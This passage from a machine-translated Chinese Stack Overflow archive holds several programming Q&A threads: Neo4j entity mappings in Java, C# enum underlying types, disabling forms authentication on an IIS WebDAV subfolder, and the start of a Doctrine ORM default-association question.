    @ExcelCell( type={NewBuilding.class}, cell=6, sheet=1, row=13),
    @ExcelCell( type={ReferenceBuilding.class}, cell=6, sheet=1, row=21),
    @ExcelCell( type={RefurbishedBuilding.class}, cell=6, sheet=1, row=22),
    })
    @Fetch
    @Indexed(indexName = "name", indexType = IndexType.FULLTEXT) 
    private String name;

    @ExcelCells({
    @ExcelCell( type={NewBuilding.class}, cell=7, sheet=1, row=55),
    @ExcelCell( type={ReferenceBuilding.class}, cell=7, sheet=1, row=39),
    @ExcelCell( type={RefurbishedBuilding.class}, cell=8, sheet=1, row=74),
    })
    @Fetch

    private Double rentableArea;

    @ExcelCells({
    @ExcelCell( type={NewBuilding.class}, cell=7, sheet=1, row=54),
    @ExcelCell( type={ReferenceBuilding.class}, cell=7, sheet=1, row=38),
    @ExcelCell( type={RefurbishedBuilding.class}, cell=8, sheet=1, row=73),
    })
    @Fetch

    private Double totalCooledNetRoomArea;

    @ExcelCells({
    @ExcelCell( type={NewBuilding.class}, cell=7, sheet=1, row=52),
    @ExcelCell( type={ReferenceBuilding.class}, cell=7, sheet=1, row=36),
    @ExcelCell( type={RefurbishedBuilding.class}, cell=8, sheet=1, row=71),
    })
    @Fetch

    private Double totalGrossFloorArea;

    @ExcelCells({
    @ExcelCell( type={NewBuilding.class}, cell=7, sheet=1, row=53),
    @ExcelCell( type={ReferenceBuilding.class}, cell=7, sheet=1, row=37),
    @ExcelCell( type={RefurbishedBuilding.class}, cell=8, sheet=1, row=72),
    })
    @Fetch

    private Double totalHeatedNetRoomArea;

    @ExcelRef
    @RelatedTo(type = "area", elementClass = Area.class, direction=Direction.BOTH)

    private Area area;

    @ExcelRef
    @RelatedTo(type = "community", elementClass = Community.class, direction=Direction.BOTH)

    private Community community;

    @ExcelRef
    @RelatedTo(type = "costsForTheEntireBuilding", elementClass = CostsForTheEntireBuilding.class, direction=Direction.BOTH)

    private CostsForTheEntireBuilding costsForTheEntireBuilding;

    @ExcelRef
    @RelatedTo(type = "country", elementClass = Country.class, direction=Direction.BOTH)

    private Country country;

    @ExcelRef
    @RelatedTo(type = "project", elementClass = Project.class, direction=Direction.BOTH)

    private Project project;

    @RelatedTo(type = "costsForSelectedMeasuresOfBuilding", elementClass = CostsForSelectedMeasuresOfBuilding.class, direction=Direction.BOTH)

    private Set<CostsForSelectedMeasuresOfBuilding> costsForSelectedMeasuresOfBuilding = new LinkedHashSet<CostsForSelectedMeasuresOfBuilding>();

    @RelatedTo(type = "groupCostsOfBuildings", elementClass = GroupCostsOfBuilding.class, direction=Direction.BOTH)

    private Set<GroupCostsOfBuilding> groupCostsOfBuildings = new LinkedHashSet<GroupCostsOfBuilding>();

    @RelatedTo(type = "individualCostsOfBuilding", elementClass = IndividualCostsOfBuilding.class, direction=Direction.BOTH)

    private Set<IndividualCostsOfBuilding> individualCostsOfBuilding = new LinkedHashSet<IndividualCostsOfBuilding>();

    public Building(){}

    // getters and setters ommitted
} 
```

这是扩展抽象 Building 类并保留在 DB 中的 NewBuilding 类。

```
@NodeEntity

public class NewBuilding extends Building  {

    @ExcelCell( type={}, cell=6, sheet=1, row=38)
    @Fetch

    private String applicableThresholdUnit;

    @ExcelCell( type={}, cell=7, sheet=1, row=38)
    @Fetch

    private String applicableThresholdValue;

    @ExcelDropdown(sheet=1, ids={1111})

    private AtticType atticType;

    @ExcelCell( type={}, cell=7, sheet=1, row=67)
    @Fetch

    private Double averageEnergyTransmittanceOfWindowsAccordingToRequirements;

    @ExcelCell( type={}, cell=8, sheet=1, row=67)
    @Fetch

    private Double averageEnergyTransmittanceOfWindowsRealised;

    @ExcelCell( type={}, cell=7, sheet=1, row=64)
    @Fetch

    private Double averageHTCFacadeAccordingToRequirements;

    @ExcelCell( type={}, cell=10, sheet=1, row=64)
    @Fetch

    private Double averageHTCFacadeBuildingEnvelopeSurfaces;

    @ExcelCell( type={}, cell=8, sheet=1, row=64)
    @Fetch

    private Double averageHTCFacadeRealised;

    @ExcelCell( type={}, cell=7, sheet=1, row=65)
    @Fetch

    private Double averageHTCGroundFloorAccordingToRequirements;

    @ExcelCell( type={}, cell=10, sheet=1, row=65)
    @Fetch

    private Double averageHTCGroundFloorBuildingEnvelopeSurfaces;

    @ExcelCell( type={}, cell=8, sheet=1, row=65)
    @Fetch

    private Double averageHTCGroundFloorRealised;

    @ExcelCell( type={}, cell=7, sheet=1, row=63)
    @Fetch

    private Double averageHTCRoofAccordingToRequirements;

    @ExcelCell( type={}, cell=10, sheet=1, row=63)
    @Fetch

    private Double averageHTCRoofBuildingEnvelopeSurfaces;

    @ExcelCell( type={}, cell=8, sheet=1, row=63)
    @Fetch

    private Double averageHTCRoofRealised;

    @ExcelCell( type={}, cell=7, sheet=1, row=66)
    @Fetch

    private Double averageHTCWindowsAccordingToRequirements;

    @ExcelCell( type={}, cell=10, sheet=1, row=66)
    @Fetch

    private Double averageHTCWindowsFloorBuildingEnvelopeSurfaces;

    @ExcelCell( type={}, cell=8, sheet=1, row=66)
    @Fetch

    private Double averageHTCWindowsFloorRealised;

    @ExcelDropdown(sheet=1, ids={1110})

    private BasementType basementType;

    @ExcelDropdown(sheet=1, ids={1636}, type={NewBuilding.class, })

    private BuildingIsOwnedOrRented buildingIsOwnedOrRented;

    @ExcelDropdown(sheet=1, ids={1635}, type={NewBuilding.class, })

    private BuildingIsPrivateOrPublic buildingIsPrivateOrPublic;

    @ExcelDropdown(sheet=1, ids={1112})

    private BuildingType buildingType;

    @ExcelCell( type={}, cell=10, sheet=1, row=73)
    @Fetch

    private Double calculatedFinalEnergyDemandForCoolingElectricity;

    @ExcelCell( type={}, cell=11, sheet=1, row=73)
    @Fetch

    private Double calculatedFinalEnergyDemandForCoolingNonElectricity;

    @ExcelCell( type={}, cell=8, sheet=1, row=73)
    @Fetch

    private Double calculatedFinalEnergyDemandForDomesticHotWaterElectricity;

    @ExcelCell( type={}, cell=9, sheet=1, row=73)
    @Fetch

    private Double calculatedFinalEnergyDemandForDomesticHotWaterNonElectricity;

    @ExcelCell( type={}, cell=6, sheet=1, row=73)
    @Fetch

    private Double calculatedFinalEnergyDemandForHeatingElectricity;

    @ExcelCell( type={}, cell=7, sheet=1, row=73)
    @Fetch

    private Double calculatedFinalEnergyDemandForHeatingNonElectricity;

    @ExcelCell( type={}, cell=10, sheet=1, row=72)
    @Fetch

    private Double calculatedFinalEnergyDemandOfRefBuildingForCoolingElectricity;

    @ExcelCell( type={}, cell=11, sheet=1, row=72)
    @Fetch

    private Double calculatedFinalEnergyDemandOfRefBuildingForCoolingNonElectricity;

    @ExcelCell( type={}, cell=8, sheet=1, row=72)
    @Fetch

    private Double calculatedFinalEnergyDemandOfRefBuildingForDomesticHotWaterElectricity;

    @ExcelCell( type={}, cell=9, sheet=1, row=72)
    @Fetch

    private Double calculatedFinalEnergyDemandOfRefBuildingForDomesticHotWaterNonElectricity;

    @ExcelCell( type={}, cell=6, sheet=1, row=72)
    @Fetch

    private Double calculatedFinalEnergyDemandOfRefBuildingForHeatingElectricity;

    @ExcelCell( type={}, cell=7, sheet=1, row=72)
    @Fetch

    private Double calculatedFinalEnergyDemandOfRefBuildingForHeatingNonElectricity;

    @ExcelCell( type={}, cell=12, sheet=1, row=72)
    @Fetch

    private Double calculatedFinalEnergyDemandOfRefBuildingForLightingAndOther;

    @ExcelCell( type={}, cell=6, sheet=1, row=20 ,textToIgnore="month/year")
    @Fetch

    private String completionDate;

    @ExcelCheckboxYesNo(sheet=1, yesId=1222, noId=1223)
    @Fetch

    private boolean contractingAgreementExists;

    @ExcelCell( type={}, cell=7, sheet=1, row=40 ,textToIgnore="Remarks")
    @Fetch

    private String contractingAgreementRemarks;

    @ExcelDropdown(sheet=1, ids={751}, type={NewBuilding.class, })

    private DemonstrationActivityScheme demonstrationActivityScheme;

    @ExcelCell( type={NewBuilding.class}, cell=2, sheet=5, row=11)
    @Fetch

    private Date endDateOfMonitoringPeriod;

    @ExcelCell( type={NewBuilding.class}, cell=10, sheet=1, row=73)
    @Fetch

    private Double energyDemandCoolingElectricityConcerto;

    @ExcelCell( type={NewBuilding.class}, cell=10, sheet=1, row=72)
    @Fetch

    private Double energyDemandCoolingElectricityNational;

    @ExcelCell( type={NewBuilding.class}, cell=11, sheet=1, row=73)
    @Fetch

    private Double energyDemandCoolingNonElectricityConcerto;

    @ExcelCell( type={NewBuilding.class}, cell=11, sheet=1, row=72)
    @Fetch

    private Double energyDemandCoolingNonElectricityNational;

    @ExcelCell( type={NewBuilding.class}, cell=8, sheet=1, row=73)
    @Fetch

    private Double energyDemandDomesticHotWaterElectricityConcerto;

    @ExcelCell( type={NewBuilding.class}, cell=8, sheet=1, row=72)
    @Fetch

    private Double energyDemandDomesticHotWaterElectricityNational;

    @ExcelCell( type={NewBuilding.class}, cell=9, sheet=1, row=73)
    @Fetch

    private Double energyDemandDomesticHotWaterNonElectricityConcerto;

    @ExcelCell( type={NewBuilding.class}, cell=9, sheet=1, row=72)
    @Fetch

    private Double energyDemandDomesticHotWaterNonElectricityNational;

    @ExcelCell( type={NewBuilding.class}, cell=6, sheet=1, row=73)
    @Fetch

    private Double energyDemandHeatingElectricityConcerto;

    @ExcelCell( type={NewBuilding.class}, cell=6, sheet=1, row=72)
    @Fetch

    private Double energyDemandHeatingElectricityNational;

    @ExcelCell( type={NewBuilding.class}, cell=7, sheet=1, row=73)
    @Fetch

    private Double energyDemandHeatingNonElectricityConcerto;

    @ExcelCell( type={NewBuilding.class}, cell=7, sheet=1, row=72)
    @Fetch

    private Double energyDemandHeatingNonElectricityNational;

    @ExcelCell( type={NewBuilding.class}, cell=12, sheet=1, row=73)
    @Fetch

    private Double energyDemandLightingAndAllOtherElectricityConcerto;

    @ExcelCell( type={NewBuilding.class}, cell=12, sheet=1, row=72)
    @Fetch

    private Double energyDemandLightingAndAllOtherElectricityNational;

    @ExcelCheckboxYesNo(sheet=1, yesId=1188, noId=1189)
    @Fetch

    private boolean energyPerformanceCertificate;

    @ExcelDropdown(sheet=1, ids={1103})

    private EnergyPerformanceIndicatorRefersTo energyPerformanceIndicatorRefersTo;

    @ExcelCell( type={}, cell=8, sheet=1, row=90 ,textToIgnore="specify capacity")
    @Fetch

    private String energyStorageCoolingCapacity;

    @ExcelCell( type={}, cell=10, sheet=1, row=90 ,textToIgnore="Remarks")
    @Fetch

    private String energyStorageCoolingRemarks;

    @ExcelDropdown(sheet=1, ids={2024})

    private CapacityUnit energyStorageCoolingUnit;

    @ExcelCheckbox(sheet=1, ids={1375})
    @Fetch

    private boolean energyStorageCoolingUsed;

    @ExcelCell( type={}, cell=8, sheet=1, row=89 ,textToIgnore="specify capacity")
    @Fetch

    private String energyStorageDHWCapacity;

    @ExcelCell( type={}, cell=10, sheet=1, row=89 ,textToIgnore="Remarks")
    @Fetch

    private String energyStorageDHWRemarks;

    @ExcelDropdown(sheet=1, ids={2023})

    private CapacityUnit energyStorageDHWUnit;

    @ExcelCheckbox(sheet=1, ids={1371})
    @Fetch

    private boolean energyStorageDHWUsed;

    @ExcelCell( type={}, cell=8, sheet=1, row=91 ,textToIgnore="specify capacity")
    @Fetch

    private String energyStorageElectricalCapacity;

    @ExcelCell( type={}, cell=10, sheet=1, row=91 ,textToIgnore="Remarks")
    @Fetch

    private String energyStorageElectricalRemarks;

    @ExcelDropdown(sheet=1, ids={2025})

    private CapacityUnit energyStorageElectricalUnit;

    @ExcelCheckbox(sheet=1, ids={1469})
    @Fetch

    private boolean energyStorageElectricalUsed;

    @ExcelCell( type={}, cell=8, sheet=1, row=88 ,textToIgnore="specify capacity")
    @Fetch

    private String energyStorageSpaceHeatingCapacity;

    @ExcelCell( type={}, cell=10, sheet=1, row=88 ,textToIgnore="Remarks")
    @Fetch

    private String energyStorageSpaceHeatingRemarks;

    @ExcelDropdown(sheet=1, ids={2022})

    private CapacityUnit energyStorageSpaceHeatingUnit;

    @ExcelCheckbox(sheet=1, ids={1370})
    @Fetch

    private boolean energyStorageSpaceHeatingUsed;

    @ExcelCell( type={}, cell=8, sheet=1, row=87 ,textToIgnore="specify capacity")
    @Fetch

    private String energyStorageThermalCapacity;

    @ExcelCell( type={}, cell=10, sheet=1, row=87 ,textToIgnore="Remarks")
    @Fetch

    private String energyStorageThermalRemarks;

    @ExcelDropdown(sheet=1, ids={2021})

    private CapacityUnit energyStorageThermalUnit;

    @ExcelCheckbox(sheet=1, ids={1367})
    @Fetch

    private boolean energyStorageThermalUsed;

    @Fetch

    private Double formulaPEFec;

    @Fetch

    private Double formulaPEN;

    @ExcelCheckbox(sheet=1, ids={2041})
    @Fetch

    private boolean indicatorContainsCooling;

    @ExcelCell( type={}, cell=6, sheet=1, row=35)
    @Fetch

    private String indicatorContainsCoolingUnit;

    @ExcelCell( type={}, cell=7, sheet=1, row=35)
    @Fetch

    private String indicatorContainsCoolingValue;

    @ExcelCheckbox(sheet=1, ids={2040})
    @Fetch

    private boolean indicatorContainsDomesticHotWaterProduction;

    @ExcelCell( type={}, cell=6, sheet=1, row=34)
    @Fetch

    private String indicatorContainsDomesticHotWaterProductionUnit;

    @ExcelCell( type={}, cell=7, sheet=1, row=34)
    @Fetch

    private String indicatorContainsDomesticHotWaterProductionValue;

    @ExcelCheckbox(sheet=1, ids={2042})
    @Fetch

    private boolean indicatorContainsLighting;

    @ExcelCell( type={}, cell=6, sheet=1, row=37)
    @Fetch

    private String indicatorContainsLightingUnit;

    @ExcelCell( type={}, cell=7, sheet=1, row=37)
    @Fetch

    private String indicatorContainsLightingValue;

    @ExcelCheckbox(sheet=1, ids={2039})
    @Fetch

    private boolean indicatorContainsSpaceHeating;

    @ExcelCell( type={}, cell=6, sheet=1, row=33)
    @Fetch

    private String indicatorContainsSpaceHeatingUnit;

    @ExcelCell( type={}, cell=7, sheet=1, row=33)
    @Fetch

    private String indicatorContainsSpaceHeatingValue;

    @ExcelCheckbox(sheet=1, ids={2038})
    @Fetch

    private boolean indicatorContainsVentilation;

    @ExcelCell( type={}, cell=6, sheet=1, row=36)
    @Fetch

    private String indicatorContainsVentilationUnit;

    @ExcelCell( type={}, cell=7, sheet=1, row=36)
    @Fetch

    private String indicatorContainsVentilationValue;

    @ExcelCell( type={NewBuilding.class}, cell=6, sheet=1, row=14)
    @Fetch

    private String location;

    @ExcelDropdown(sheet=1, ids={1101})

    private MainCharacteristicsOfCertificate1 mainCharacteristicsOfCertificate1;

    @ExcelDropdown(sheet=1, ids={1102})

    private MainCharacteristicsOfCertificate2 mainCharacteristicsOfCertificate2;

    @ExcelCell( type={}, cell=6, sheet=1, row=21)
    @Fetch

    private String nameOfAppliedBuildingCode;

    @ExcelCell( type={}, cell=6, sheet=1, row=27)
    @Fetch

    private String nameOfCertificate;

    @ExcelCell( type={}, cell=6, sheet=1, row=24)
    @Fetch

    private String networks;

    @ExcelCell( type={}, cell=6, sheet=1, row=48)
    @Fetch

    private String numberOfAppartmentsForResidentialBuilding;

    @ExcelCell( type={NewBuilding.class}, cell=6, sheet=1, row=18)
    @Fetch

    private String numberOfBuildingsRepresentedByThisBuilding;

    @ExcelCell( type={}, cell=6, sheet=1, row=49)
    @Fetch

    private String numberOfInhabitantsForResidentialBuilding;

    @ExcelCell( type={}, cell=6, sheet=1, row=50)
    @Fetch

    private String numberOfOccupantsForNonResidentialBuilding;

    @ExcelCell( type={}, cell=7, sheet=1, row=62)
    @Fetch

    private Double overallAverageHTCAccordingToRequirements;

    @ExcelCell( type={}, cell=10, sheet=1, row=62)
    @Fetch

    private Double overallAverageHTCBuildingEnvelopeSurfaces;

    @ExcelCell( type={}, cell=8, sheet=1, row=62)
    @Fetch

    private Double overallAverageHTCRealised;

    @ExcelDropdown(sheet=1, ids={1109})

    private PositionToNeighboringBuildings positionToNeighboringBuildings;

    @ExcelCell( type={NewBuilding.class}, cell=6, sheet=1, row=23 ,textToIgnore="id of reference building")
    @Fetch

    private String referenceBuildingId;

    @ExcelCell( type={}, cell=6, sheet=1, row=19 ,textToIgnore="month/year")
    @Fetch

    private String startDateOfConstructionWorks;

    @ExcelCell( type={NewBuilding.class}, cell=2, sheet=5, row=10)
    @Fetch

    private Date startDateOfMonitoringPeriod;

    @ExcelCheckboxYesNo(sheet=1, yesId=1443, noId=1444)
    @Fetch

    private boolean totalDomesticGasConsumptionIncludesGasForCooking;

    @ExcelCell( type={NewBuilding.class}, cell=7, sheet=1, row=58)
    @Fetch

    private Double totalGrossBuildingVolumeExternal;

    @ExcelCell( type={NewBuilding.class}, cell=7, sheet=1, row=60)
    @Fetch

    private Double totalNetCooledVolumeInternal;

    @ExcelCell( type={NewBuilding.class}, cell=7, sheet=1, row=59)
    @Fetch

    private Double totalNetHeatedVolumeInternal;

    @ExcelCell( type={}, cell=6, sheet=1, row=31)
    @Fetch

    private String unitOfIndicator;

    @ExcelCell( type={}, cell=7, sheet=1, row=31)
    @Fetch

    private String valueOfIndicator;

    @ExcelCell( type={}, cell=6, sheet=1, row=22 ,textToIgnore="year")
    @Fetch

    private String yearOfPublicationOfAppliedBuildingCode;

    @ExcelRef
    @RelatedTo(type = "characterisationOfAppliedBuildingFeatures", elementClass = CharacterisationOfAppliedBuildingFeatures.class, direction=Direction.BOTH)

    private CharacterisationOfAppliedBuildingFeatures characterisationOfAppliedBuildingFeatures;

    @ExcelCollection(type=BuildingEnergyService.class, start=0, end=5)
    @RelatedTo(type = "appliedEnergyServices", elementClass = BuildingEnergyService.class, direction=Direction.BOTH)

    private Set<BuildingEnergyService> appliedEnergyServices = new LinkedHashSet<BuildingEnergyService>();

    @ExcelCollection(type=MonitoringYearTotal.class, start=0, end=5, orientation=Orientation.SHEET)
    @RelatedTo(type = "monitoringYears", elementClass = MonitoringYearTotal.class, direction=Direction.BOTH)

    private Set<MonitoringYearTotal> monitoringYears = new LinkedHashSet<MonitoringYearTotal>();

    public NewBuilding(){}

    // getters and setters ommitted
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-16T21:01:24.227

*   您能否分享您的实体或表现出相同行为的示例项目？
*   您的数据库中已有多少数据？
*   您使用简单映射还是高级映射？
*   您是否有跨越该方法的外部事务`save`？
*   我认为您的时间花在处理关系上（SDN 对每个关系进行重复检查）您可以尝试替换那些`template.createRelationshipBetween(entity1, entity2, type, properties, true)`跳过这些检查的关系吗？

# c# - “枚举：类型”和简单的“枚举”有什么区别

> ID：13841923
> 
> 赞同：7
> 
> 时间：2012-12-12T14:32:26.963
> 
> 标签：c#, .net, enums

我试图了解一些关于`Enums`一般情况的事情以及它们如何`Chars`具体工作。以下是我正在使用的示例：

```
public enum AuditInteractionTypes
{
    Authorized = 'A',
    Created = 'C',
    Revised = 'R',
    Extracted = 'E',
    Deleted = 'D'
} 
```

`enum AuditInteractionTypes`首先，声明它们或声明它们有什么区别`enum AuditInteractionTypes : char`

其次，我看过许多关于尝试使用`Enums`with`chars`以及如何“使”它来回工作的帖子。可能是愚蠢的问题，但为什么我不能简单地以`string`.

所以，例如，`Authorized = "A"`。

如果这很重要，我已经使用 Linq To SQL 作为我的 DAL，尽管我希望这是一个不特定于我的环境的更广泛级别的问题。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-12T14:34:26.237

它规定了将用于存储枚举的基础类型。

当您不使用`enum`任何其他内容时，它使用 an`int`作为底层存储类型。

当您使用`enum : <type>`时，它使用该类型作为基础存储类型。

[根据C# 参考](http://msdn.microsoft.com/en-us/library/sbbt4032.aspx)，在您的情况下，您正在尝试创建 type 的基础类型`char`，但这是无效的：

> 已批准的枚举类型为 byte、sbyte、short、ushort、int、uint、long 或 ulong。

如果要存储`char`值，则有两种选择。

您可以使用基础类型[`ushort`](http://msdn.microsoft.com/en-us/library/vstudio/cbf1574z.aspx)（它是一个无符号的 16 位整数，如`char`），如下所示：

```
public enum AuditInteractionTypes : ushort
{
    Authorized = 'A',
    Created = 'C',
    Revised = 'R',
    Extracted = 'E',
    Deleted = 'D'
} 
```

`char`有一个隐式转换，`ushort`所以上述工作。此外，您可以轻松地比较两者。

如果[您想使用字符串作为值，](https://stackoverflow.com/questions/13841923/whats-the-difference-between-enum-type-and-simply-enum/13841959#comment19052623_13841959)那么我会推荐一个`enum`-like 类，如下所示：

```
public static class AuditInteractionTypes
{
    // You can make these static readonly if they are likely to change.
    public const string Authorized = "A";
    public const string Created = "C";
    public const string Revised = "R";
    public const string Extracted = "E";
    public const string Deleted = "D";
} 
```

然后，这个类看起来几乎与 an 相同，`enum`并且以相同的方式编码。

请注意，任何类型都可以使用相同的技巧，但通常这些类型应该是*完全*不可变的。 `string`很好地满足了这个准则，完全不可变（大多数系统值类型和其他值类型也是如此，如果你设计正确的话）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:47:07.857

枚举的“基本类型”必须是整数值类型。字符串不符合条件，那是引用类型。

仅当您与非托管代码进行互操作时，通常才需要不使用默认值 (int)。C 和 C++ 语言还允许使用相同的基本类型指定枚举的大小。当您有很多 [Flags] 枚举值时，使用 long 的极端情况很有用，允许您区分多达 64 个标志值。

如果你真的想压缩存储需求，你可以选择字节或短。由于更好地使用 cpu 缓存，这可以加快代码速度。由于类或结构中其他字段的对齐要求，这通常不会很好。当您操作此类枚举值时，您可能会失去缓存优势，例如测试它们的值或隔离标志，32 位处理器真的很喜欢 int，您将为转换付费。分析是必需的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-08-07T22:54:46.063

回答这个：

> 可能是愚蠢的问题，但为什么我不能简单地来回作为一个字符串。

您可以使用这样的实现：

```
using System.ComponentModel;

public enum AuditInteractionTypes
{
    [Description("A")] Authorized,
    [Description("C")] Created,
    [Description("R")] Revised,
    [Description("E")] Extracted,
    [Description("D")] Deleted
} 
```

所以基本上每个元素都会收到一些字符串值。

或者您可以使用结构：

```
struct AuditInteractionTypes
{
    static string Authorized = "A";
    static string Created = "C";
    static int Revised = 0;
    static char[] Extracted = "E".ToCharArray(); //Not sure if this one is usefull
} 
```

# authentication - 在子文件夹或虚拟目录上禁用表单身份验证

> ID：13841924
> 
> 赞同：6
> 
> 时间：2012-12-12T14:32:30.537
> 
> 标签：authentication, iis, forms-authentication

**这是我的场景：**

我在 IIS (7.5) 中设置了一个使用表单身份验证的网站。我在该网站中有一个子文件夹，用作 WebDAV 共享。我有一个自定义 HTTP 模块来监视我的 WebDAV 请求，并且还充当自定义身份验证级别。当用户尝试将驱动器映射到我的 WebDAV 共享时，此自定义身份验证将首先发送 HTTP 401 质询以获取用户的凭据，然后将凭据从 Basic-Auth 标头服务器端解析出来。问题是只有在 Forms Authentication 关闭时才会发送 Basic-Auth 标头。

更重要的是，通常当我的 HTTP 模块没有找到 Auth Header 时，会发送 401 Challenge（当 Forms Auth 关闭时提示用户输入凭据）。但是，打开 Forms Auth 后，我的 HTTP 模块仍会执行并发送 401 挑战，但 Forms Auth 似乎具有优先权，因此在 Fiddler 中我可以清楚地看到重定向到：

> /Account/Login.aspx?ReturnURL=MySubFolder

自定义身份验证的重点是，在将驱动器映射到我的 WebDAV 共享时，我可以允许用户登录到*我的站点。*我想捕获他们的网站凭据，对其进行身份验证，然后向他们展示目录的内容。

**所以我的问题是：**

有没有办法在启用表单身份验证的网站中的子文件夹或虚拟目录上禁用表单身份验证？

我已经验证我可以通过在我的网站中创建一个新的应用程序并将子文件夹放在那里，然后在应用程序本身上禁用 Forms Auth 来解决这个问题，但如果可能的话，我真的不希望这样做。

我尝试过的所有事情（如下所列）都导致我请求将驱动器映射到`Http://localhost/MySubFolder`被表单身份验证接管（至少这是我认为正在发生的事情）并重定向到`/login.aspx?ReturnUrl=MySubFolder`（如 Fiddler 中所示）。

**这是我尝试过的：**

**1)**添加了一个单独的 Web.config `MySubFolder`：

```
 <configuration>
     <system.web>
       <authorization>
         <allow users="*"/>
       </authorization>
     </system.web>
   </configuration> 
```

**2)**`<location>`在根级 Web.config 中添加了一个标签，`MySubFolder`如下所示：

```
 <location path="MySubFolder">
     <system.web>
       <authorization>
         <allow users="*"/>
       </authorization>
     </system.web>
   </location> 
```

**3)**着眼于更新 IIS 中的[功能委派](http://www.iis.net/learn/manage/managing-your-configuration-settings/an-overview-of-feature-delegation-in-iis)。

就个人而言，我对上述解决方案有一些疑问，因为从我读过的内容来看，它们只是为了允许所有访问，同时仍然启用表单身份验证。**我需要一种方法来在我的子文件夹上禁用 Forms Authentication**。这可能吗？

我还应该注意，我的子文件夹*可能*是一个虚拟目录，但不是必须的。我只需要一种在该文件夹上禁用 Forms Auth 的方法。

**根据请求，我的 Web.config 文件（站点级）：**

```
<?xml version="1.0"?>
<configuration>
  <connectionStrings>
    <add name="MyConnString" connectionString="Persist Security Info=True;Initial Catalog=MyDB;Data Source=MyServer;User ID=UserName;Password=xxxxxxxxxx;MultipleActiveResultSets=True;"/>
  </connectionStrings>
  <system.web>
    <compilation debug="true" strict="false" explicit="true" targetFramework="4.0" />
    <authentication mode="Forms">
      <forms loginUrl="~/Account/Login.aspx" timeout="2880" />
    </authentication>
  </system.web>
  <system.webServer>
    <modules runManagedModulesForWebDavRequests="true" runAllManagedModulesForAllRequests="true">
      <add name="CustomWebDAVModule" type="CustomWebDAVModule"/>
    </modules>
  </system.webServer>
</configuration> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-03T19:56:32.230

这个问题已经回答了：[Multiple/Different authentication settings in web.config](https://stackoverflow.com/questions/318816/multiple-different-authentication-settings-in-web-config)

您不能覆盖位置标签中的根身份验证模式=“表单”标签。使文件夹成为自己的应用程序是最简单的方法。

另一种选择是实现您自己的自定义表单身份验证，并让它忽略您的 webdav 文件夹的重定向。

```
<authentication mode="None"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T15:16:22.783

显然您*没有*在 IIS 中正确设置 WebDAV。

由于您想使用自定义 webdav 模块进行身份验证，我们首先需要确保 IIS 不会*干扰*您的 WebDAV 请求。

请按照以下步骤操作（请注意，重点在步骤 7 中）：

1.  保持`web.config`原样（如问题中所述）。

2.  在 IIS 中启用 WebDav。在 IIS 管理器中选择您的网站。主窗口内打开`WebDAV Authoring Rules`。

    ![打开 WebDAV 创作规则](../Images/b4f384cc7fb257beb903a0eba4dfb639.png)

3.  在操作窗格（右侧）中单击`Enable WebDAV`。

    ![启用 WebDav](../Images/0f49bd4b37ec0a921ecf863adfaf34f8.png)

4.  现在选择要启用 WebDAV 的子文件夹（我`path3`在我的示例中使用），方法是单击它，然后打开`WebDAV Authoring Rules`.

    ![打开子文件夹的 WebDAV 创作规则](../Images/2a317a0431b8a877985496d19ef6189b.png)

5.  单击`Add authoring rule...`操作窗格（右侧）。

    ![单击-添加创作规则...-](../Images/cb30ddd93f0546ee9fea1ea5a853688e.png)

6.  在打开的对话框中，确保所有这些都被选中`All content`、`All users`、`Read`，`Source`然后`Write`单击`OK`。这将向具有所有权限的所有用户授予对该子文件夹所有内容的访问权限。

    ![添加创作规则](../Images/7c2f1b0c99aa46713c27607322f0f160.png)

7.  现在是最重要的部分。由于您想通过*自定义*WebDAV 处理程序处理 WebDAV 身份验证，我们必须明确告诉 IIS*不要*干扰身份验证。我们如何做到这一点？我们告诉 IIS 允许*匿名*WebDAV 访问。这样 IIS 不会尝试对用户进行身份验证，并且您的模块可以自由地执行其授权操作。为此，我们需要设置`Allow Anonymous Property Queries`为`True`under `WebDav settings`。接下来的步骤将重点介绍如何执行此操作。

8.  打开站点根目录`WebDAV Authoring Rules`。

    ![打开 WebDAV 创作规则](../Images/b4f384cc7fb257beb903a0eba4dfb639.png)

9.  单击`WebDAV settings...`。

    ![点击 -WebDAV 设置...-](../Images/fb4f09385aafd0183f22f512cef6739c.png)

10.  设置`Allow Anonymous Property Queries`为`True`。

    ![设置允许匿名属性查询](../Images/4395cc602d779ec738b896ef88a0ff7d.png)

11.  关闭并重新启动您将在其上进行测试的 WebDAV 客户端。这是为了确保它不会缓存来自先前错误配置的连接参数。

12.  检查您网站的 WebDAV 配置是否按预期工作。:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-10-26T04:09:41.687

在您的自定义 HTTP 模块中，您可以告诉表单身份验证通过以下方式抑制重定向`HttpResponse.SuppressFormsAuthenticationRedirect`：

```
public class DavAuthenticationModule : IHttpModule
{
        public void Init(HttpApplication application)
        {
            application.AuthenticateRequest += App_OnAuthenticateRequest;
        }

        private void App_OnAuthenticateRequest(object source, EventArgs eventArgs)
        {
            // Only applies for WebDAV requests.
            var ctx = HttpContext.Current;
            if (!ctx.Request.Path.StartsWith("/dav/path", StringComparison.OrdinalIgnoreCase))
                return;

            // So that forms auth won't do a redirect.
            // Note that it will still attempt to read / parse the forms auth cookie.
            ctx.Response.SuppressFormsAuthenticationRedirect = true;        

            // Now do my own auth.
            DoBasicHttpAuthentication(ctx);
        }
} 
```

`FormsAuthenticationModule.Authenticate`另一种选择是在 Forms Auth 完全运行之前挂钩事件以进行身份​​验证。这将要求您在 IIS 中寻找模块实例，我没有示例。

这两个选项都基于 .NET 4.6 参考源：[http ://referencesource.microsoft.com/#System.Web/Security/FormsAuthenticationModule.cs,ac471f8ac73cdb2b](http://referencesource.microsoft.com/#System.Web/Security/FormsAuthenticationModule.cs,ac471f8ac73cdb2b)

# php - Doctrine ORM 关联的默认值

> ID：13841925
> 
> 赞同：2
> 
> 时间：2012-12-12T14:32:33.950
> 
> 标签：php, symfony, doctrine-orm

我有实体（如下所示）。我想在创建时设置一些默认值。正如您在 中看到的`__construct`，设置（字符串）很容易`$name`，但是如何设置`$group`？（例如我知道数据库中有一个组`id=122`）

```
/**
 * @ORM\Entity
 */
class Person {
    private $id;

    /** @ORM\Column(type="string") */
    private $name;

    /**
     * @ORM\ManyToOne(targetEntity="Group", inversedBy="persons")
     * @ORM\JoinColumn(referencedColumnName="id")
